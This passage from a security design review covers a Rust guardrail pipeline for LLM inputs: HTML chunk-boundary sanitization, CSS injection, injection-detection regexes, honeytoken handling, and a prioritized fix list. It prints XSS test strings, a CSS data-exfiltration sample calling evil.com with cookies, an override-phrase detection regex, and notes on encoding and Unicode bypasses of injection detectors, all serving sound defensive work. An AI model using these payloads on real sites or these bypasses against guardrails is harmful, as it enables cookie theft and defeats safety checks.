- If state not properly maintained: Attribute not detected
```

#### 7.1.3 Deeply Nested Structures
```html
<div><div><div>...<div(1000 levels)...
    <script>alert(1)</script>
...</div></div></div>

If parser stack depth limited:
- Inner <script> not reached
- Or parser aborts, partially sanitized output returned
```

**lol_html Architecture:**
- Streaming HTML rewriter, processes chunks incrementally
- Maintains internal state machine for tag/attribute/text parsing
- **Critical:** State must be consistent across chunk boundaries

**Recommendations:**

```rust
use lol_html::{HtmlRewriter, Settings, element};

pub struct StreamingSanitizer {
    max_chunk_size: usize,
    max_depth: usize,
}

impl StreamingSanitizer {
    /// Sanitize HTML with proper chunk handling
    pub fn sanitize(&self, html: &str) -> Result<String, SanitizationError> {
        let mut output = Vec::new();
        let mut depth = 0;
        
        let mut rewriter = HtmlRewriter::new(
            Settings {
                element_content_handlers: vec![
                    // Block dangerous tags
                    element!("script, style, iframe, object, embed", |el| {
                        el.remove();
                        Ok(())
                    }),
                    
                    // Track depth to prevent DoS
                    element!("*", |el| {
                        depth += 1;
                        if depth > self.max_depth {
                            return Err("Max nesting depth exceeded".into());
                        }
                        
                        // Strip dangerous attributes
                        el.remove_attribute("onerror");
                        el.remove_attribute("onload");
                        // ... all on* handlers
                        
                        Ok(())
                    }),
                ],
                ..Default::default()
            },
            |c: &[u8]| output.extend_from_slice(c),
        );
        
        // CRITICAL: Process as single chunk or use proper streaming protocol
        // Option 1: Buffer entire input (safe, but defeats streaming)
        rewriter.write(html.as_bytes())?;
        rewriter.end()?; // Finalize parsing state
        
        // Option 2: Chunked processing (advanced)
        // for chunk in html_chunks {
        //     rewriter.write(chunk)?;
        // }
        // rewriter.end()?; // MUST call end() to finalize
        
        String::from_utf8(output).map_err(|_| SanitizationError::InvalidUtf8)
    }
}

// Alternative: Pre-parse to validate structure
pub fn validate_structure_first(html: &str) -> Result<(), ValidationError> {
    use scraper::{Html, Selector};
    
    // Parse entire HTML to validate structure
    let doc = Html::parse_document(html);
    
    // Check for dangerous patterns
    let script_selector = Selector::parse("script").unwrap();
    if doc.select(&script_selector).next().is_some() {
        return Err(ValidationError::DangerousTag("script"));
    }
    
    // Then proceed with lol_html streaming sanitization
    Ok(())
}
```

**Design Requirements:**
1. **Single-pass streaming**: Process entire content in one `write()` + `end()` cycle
2. **Depth tracking**: Monitor nesting level, abort if exceeds limit (100-200)
3. **State validation**: After `end()`, verify parser is in clean state
4. **Allowlist approach**: Remove all tags/attributes not explicitly allowed
5. **Size limits**: Enforce max HTML size (1MB) BEFORE parsing
6. **Testing**: Fuzz with HTML split at every byte boundary

**Testing Strategy:**
```rust
#[test]
fn test_boundary_attack() {
    let html = "<script>alert(1)</script>";
    
    // Test split at every position
    for split_pos in 0..html.len() {
        let (chunk1, chunk2) = html.split_at(split_pos);
        
        let mut sanitizer = StreamingSanitizer::new();
        sanitizer.write(chunk1.as_bytes());
        sanitizer.write(chunk2.as_bytes());
        let output = sanitizer.end().unwrap();
        
        assert!(!output.contains("<script"), "Script tag survived split at {}", split_pos);
    }
}
```

---

### 7.2 MEDIUM: CSS Injection via Style Attributes

**Risk:** Malicious CSS in `style` attributes can leak data or execute JavaScript.

**Attack Vectors:**
```html
<!-- Data exfiltration -->
<div style="background: url('https://evil.com/exfil?data=' + document.cookie)">

<!-- JavaScript execution (old browsers, deprecated features) -->
<div style="behavior: url(xss.htc)"> <!-- IE-specific -->
<div style="expression(alert(1))"> <!-- IE-specific -->

<!-- CSS injection -->
<div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: url('...')">
```

**Recommendation:**
```rust
// Strip ALL style attributes by default
element!("*", |el| {
    el.remove_attribute("style");
    Ok(())
}),

// Or: Validate against allowlist
use css::{parse_declaration_list, CssProperty};

fn validate_style(value: &str) -> Result<String, ValidationError> {
    let declarations = parse_declaration_list(value)?;
    let allowed_properties = ["color", "background-color", "font-size"];
    
    for decl in declarations {
        if !allowed_properties.contains(&decl.property.as_str()) {
            return Err(ValidationError::DisallowedCssProperty(decl.property));
        }
        
        // Validate values: no url(), no expressions
        if decl.value.contains("url(") || decl.value.contains("expression(") {
            return Err(ValidationError::DangerousCssValue);
        }
    }
    
    Ok(declarations.to_string())
}
```

---

## 8. Additional Security Considerations

### 8.1 MEDIUM: RegexSet Compilation DoS

**Risk:** 50+ patterns in `RegexSet` may cause compilation slowness or memory exhaustion.

**Mitigation:**
```rust
// Pre-compile patterns at build time
lazy_static! {
    static ref INJECTION_PATTERNS: RegexSet = RegexSet::new(&[
        r"(?i)(ignore|disregard|forget).{0,20}(previous|prior|above)",
        // ... 48 more patterns
    ]).expect("Failed to compile injection patterns");
}

// Verify compilation in CI
#[test]
fn test_pattern_compilation() {
    use std::time::Instant;
    
    let start = Instant::now();
    let _ = &*INJECTION_PATTERNS; // Force compilation
    let elapsed = start.elapsed();
    
    assert!(elapsed < Duration::from_secs(1), "Pattern compilation too slow");
    assert_eq!(INJECTION_PATTERNS.len(), 50, "Pattern count mismatch");
}

// Memory usage test
#[test]
fn test_pattern_memory() {
    use std::mem::size_of_val;
    
    let size = size_of_val(&*INJECTION_PATTERNS);
    assert!(size < 10 * 1024 * 1024, "Pattern set exceeds 10MB");
}
```

---

### 8.2 LOW: Content Size Enforcement Ordering

**Risk:** Expensive operations (normalization, HTML parsing) run before size check.

**Current Design:**
```
User Input → NormalizationStage → InjectionStage → ...
                ↑ Parses HTML/Unicode before size check
```

**Recommendation:**
```rust
// Enforce size limit BEFORE any processing
pub struct SizeLimitStage {
    max_size: usize,
}

impl GuardrailStage for SizeLimitStage {
    async fn evaluate(&self, content: &Content) -> StageOutcome {
        if content.as_text().len() > self.max_size {
            return StageOutcome::Block(BlockReason::ContentTooLarge {
                size: content.as_text().len(),
                limit: self.max_size,
            });
        }
        StageOutcome::Allow
    }
}

// Pipeline ordering
InputPipeline::user_prompt_pipeline(&policy)
    .stage(SizeLimitStage::new(1_048_576)) // 1MB limit FIRST
    .stage(RateLimitStage::new(...))
    .stage(NormalizationStage::new(...))
    .stage(InjectionStage::new(...))
```

---

### 8.3 LOW: Ensemble Scoring Weight Validation

**Risk:** Misconfigured weights in `WeightedAverage` strategy can disable detection.

```rust
// ❌ VULNERABLE: Weights sum to 0 or negative
EnsembleStrategy::WeightedAverage {
    weights: hashmap! {
        "heuristic" => 1.0,
        "structural" => -1.0, // ⚠️ Cancels out
    }
}

// ❌ VULNERABLE: Single detector with 100% weight
EnsembleStrategy::WeightedAverage {
    weights: hashmap! {
        "heuristic" => 1.0,
        "structural" => 0.0, // Ignored
    }
}
```

**Recommendation:**
```rust
impl EnsembleStrategy {
    pub fn validate(&self) -> Result<(), ConfigError> {
        match self {
            Self::WeightedAverage { weights } => {
                let sum: f32 = weights.values().sum();
                
                if sum <= 0.0 {
                    return Err(ConfigError::InvalidWeightSum(sum));
                }
                
                if weights.values().any(|&w| w < 0.0) {
                    return Err(ConfigError::NegativeWeight);
                }
                
                // Warn if single detector dominates
                let max_weight = weights.values().max_by(|a, b| a.partial_cmp(b).unwrap());
                if max_weight > &(0.8 * sum) {
                    warn!("Single detector weight >80% of total");
                }
                
                Ok(())
            }
            _ => Ok(())
        }
    }
}
```

---

## 9. Positive Security Observations

### Strengths of Current Design

1. **✅ Correct regex choice**: Using Rust `regex` crate with guaranteed linear time (Thompson NFA) eliminates ReDoS risk
2. **✅ ring for crypto**: Industry-standard, audited, FIPS-validated cryptographic library
3. **✅ zeroize dependency**: Indicates awareness of memory safety for secrets
4. **✅ Immutable pipeline claim**: If implemented correctly, prevents TOCTOU
5. **✅ Non-degradable injection stage**: Cannot be skipped, fail-closed
6. **✅ Size enforcement**: 1MB limit prevents content-based DoS
7. **✅ Fail-closed defaults**: Secure-by-default configuration
8. **✅ HMAC fingerprints**: Better than plaintext logging of honeytoken detections
9. **✅ Randomized spotlight markers**: Prevents static delimiter detection
10. **✅ Async-first design**: Enables non-blocking security checks

---

## 10. Actionable Recommendations Summary

### P0 (Critical - Must Fix Before Implementation)

| ID | Issue | Action | Affected Component |
|----|-------|--------|-------------------|
| P0-1 | Nonce reuse risk | Use `ring::rand::SystemRandom` exclusively; document counter-based alternative with persistent state | `HoneytokenStore` |
| P0-2 | Key management undefined | Specify master key storage (keyring/HSM), implement HKDF-SHA256 derivation, add key versioning | `HoneytokenStore` |
| P0-3 | Honeytoken metrics leakage | Remove all honeytoken-specific metrics; use aggregated, time-windowed logging only | `telemetry`, `HoneytokenStore` |

### P1 (High - Address During Implementation)

| ID | Issue | Action | Affected Component |
|----|-------|--------|-------------------|
| P1-1 | Unicode confusables | Add unicode-security crate; implement skeleton-based matching; strip zero-width/directional chars | `NormalizationStage` |
| P1-2 | GCM missing AD | Bind honeytokens to context (template_id, session_id) via Associated Data | `HoneytokenStore` |
| P1-3 | TOCTOU in async pipeline | Enforce true immutability (Arc<T>, not Arc<Mutex<T>>); document guarantee | `Content`, `PipelineExecutor` |
| P1-4 | Timing attacks in pattern matching | Implement constant-time execution for all patterns; add timing normalization | `InjectionStage` |
| P1-5 | Zeroization gaps | Apply `ZeroizeOnDrop` to all key types; audit async task captures; sanitize error messages | `HoneytokenStore`, errors |

### P2 (Medium - Consider During Implementation)

| ID | Issue | Action | Affected Component |
|----|-------|--------|-------------------|
| P2-1 | Encoding bypass | Implement multi-stage decoding (Base64, hex, URL, ROT13) before pattern matching | `InjectionStage` |
| P2-2 | lol_html chunk boundaries | Test HTML splitting at all byte positions; enforce single-pass streaming | `NormalizationStage` |
| P2-3 | CSS injection | Strip `style` attributes by default or validate against strict allowlist | `NormalizationStage` |
| P2-4 | Honeytoken rotation timing | Randomize rotation intervals; gradual pool refresh; add grace period | `HoneytokenStore` |
| P2-5 | Content size ordering | Add `SizeLimitStage` as first stage in all pipelines | `PipelineExecutor` |

### P3 (Low - Nice to Have)

| ID | Issue | Action | Affected Component |
|----|-------|--------|-------------------|
| P3-1 | RegexSet compilation | Add CI test for compilation time/memory; benchmark pattern set size | `InjectionStage` |
| P3-2 | Ensemble weight validation | Validate weights sum >0, no negatives, no single-detector dominance | `EnsembleStrategy` |
| P3-3 | Encrypted blob format | Document wire format; add version header; support format evolution | `HoneytokenStore` |

---

## 11. Testing Requirements

### Security Test Suite

```rust
// Required security tests before Phase 2 acceptance

#[cfg(test)]
mod security_tests {
    // Cryptography
    #[test] fn test_nonce_uniqueness() { /* 10,000 generations, no collisions */ }
    #[test] fn test_key_derivation() { /* HKDF test vectors */ }
    #[test] fn test_gcm_ad_binding() { /* Context swapping fails */ }
    #[test] fn test_zeroization() { /* Memory inspection */ }
    
    // Unicode
    #[test] fn test_confusable_detection() { /* Cyrillic/Latin homoglyphs */ }
    #[test] fn test_zero_width_stripping() { /* ZWSP, ZWNJ, ZWJ */ }
    #[test] fn test_bidi_override_removal() { /* RLO, LRO, PDF */ }
    #[test] fn test_mixed_script_detection() { /* Latin + Cyrillic */ }
    
    // Injection Bypass
    #[test] fn test_base64_decoding() { /* Encoded injection patterns */ }
    #[test] fn test_hex_decoding() { /* Hex-encoded attacks */ }
    #[test] fn test_multi_stage_encoding() { /* Base64(Hex(...)) */ }
    
    // HTML Sanitization
    #[test] fn test_chunk_boundary_script() { /* Split "<script>" at all positions */ }
    #[test] fn test_nested_depth_limit() { /* 1000-deep nesting */ }
    #[test] fn test_incomplete_tags() { /* Chunk ends mid-tag */ }
    
    // Timing
    #[test] fn test_constant_time_scanning() { /* Statistical timing analysis */ }
    #[test] fn test_pattern_timing_uniformity() { /* All patterns ~same time */ }
    
    // TOCTOU
    #[test] fn test_content_immutability() { /* Concurrent mutation attempts */ }
    #[test] fn test_pipeline_isolation() { /* Stage cannot modify upstream */ }
}
```

### Fuzzing Targets

```rust
// cargo-fuzz targets

#[fuzz_target]
fn fuzz_normalization(data: &[u8]) {
    if let Ok(s) = std::str::from_utf8(data) {
        let _ = NormalizationStage::new().normalize(s);
    }
}

#[fuzz_target]
fn fuzz_html_sanitization(data: &[u8]) {
    if let Ok(html) = std::str::from_utf8(data) {
        let _ = sanitize_html(html);
    }
}

#[fuzz_target]
fn fuzz_injection_detection(data: &[u8]) {
    if let Ok(s) = std::str::from_utf8(data) {
        let _ = InjectionStage::new().evaluate(s);
    }
}

#[fuzz_target]
fn fuzz_honeytoken_encryption(data: &[u8]) {
    if data.len() > 16 {
        let _ = HoneytokenStore::encrypt(data);
    }
}
```

---

## 12. Compliance Mapping

### OWASP LLM Top 10 Coverage

| LLM ID | Coverage | Gaps Identified | Recommendations |
|--------|----------|-----------------|-----------------|
| LLM01 (Prompt Injection) | Strong | Unicode confusables, encoding bypass | Implement P1-1, P2-1 |
| LLM02 (Info Disclosure) | Strong | Metrics leakage, timing leaks | Implement P0-3, P1-4 |
| LLM07 (Prompt Leakage) | Medium | Honeytoken extraction possible | Implement P0-3, P1-4, P2-4 |

### NIST AI RMF Alignment

| Function | Current Status | Gaps |
|----------|---------------|------|
| MEASURE-1 (Metrics) | Partial | Honeytoken metrics leak risk (P0-3) |
| MEASURE-2 (Monitor) | Partial | Timing side-channels (P1-4) |
| MANAGE-1 (Respond) | Strong | Key rotation strategy undefined (P0-2) |

---

## 13. Sign-Off Checklist

### Before Phase 2 Implementation Begins

- [ ] **P0-1**: Nonce generation strategy documented and reviewed
- [ ] **P0-2**: Key management architecture designed and approved
- [ ] **P0-3**: Honeytoken observability plan revised (no detection metrics)
- [ ] **P1-1**: Unicode normalization library selected (unicode-security)
- [ ] **P1-2**: GCM Associated Data schema defined
- [ ] **P1-3**: Content immutability mechanism documented in ADR
- [ ] Security test plan approved (Section 11)
- [ ] Threat model updated with findings from this review

### Phase 2 Acceptance Criteria (Enhanced)

**Original:**
> >90% injection detection, <5% false positives, P95 <50ms, fuzz tests clean

**Enhanced with Security Requirements:**
- [ ] Injection detection: >90% on adversarial corpus ✅
- [ ] False positive rate: <5% ✅
- [ ] P95 latency: <50ms ✅
- [ ] Fuzz tests: 1M executions, 0 panics ✅
- [ ] **Nonce uniqueness: 10K honeytokens, 0 collisions** (P0-1)
- [ ] **Key rotation: Successful rotation with backward compat** (P0-2)
- [ ] **Honeytoken metrics: No detection-specific counters** (P0-3)
- [ ] **Unicode confusables: 100% detection on test suite** (P1-1)
- [ ] **Timing analysis: P95 variance <5% across pattern types** (P1-4)
- [ ] **Memory safety: All secrets zeroized, audit clean** (P1-5)
- [ ] **HTML sanitization: Script tags blocked at all chunk boundaries** (P2-2)

---

## Conclusion

The Phase 2 implementation plan demonstrates strong security fundamentals but requires **critical hardening in 3 areas** before proceeding:

1. **Cryptographic implementation** (nonce reuse, key management, AD binding)
2. **Observability design** (metrics-based honeytoken extraction)
3. **Unicode normalization** (confusables, zero-width, bidirectional)

**Recommendation:** Address all P0 issues and design P1 mitigations before Sprint 3 begins. The architecture is sound, but these gaps pose material risk if not resolved early.

**Estimated Impact on Timeline:**
- P0 fixes: +1 week (design + review)
- P1 implementations: Integrated into Sprint 3-5 (no delay)
- P2/P3 items: Address opportunistically

**Risk After Mitigation:** **LOW** (with P0 fixes), **MEDIUM** (without P0 fixes)

---

**Review Completed:** 2026-02  
**Next Review:** After Sprint 5 (end of Phase 2) - validation of implementation against this security review
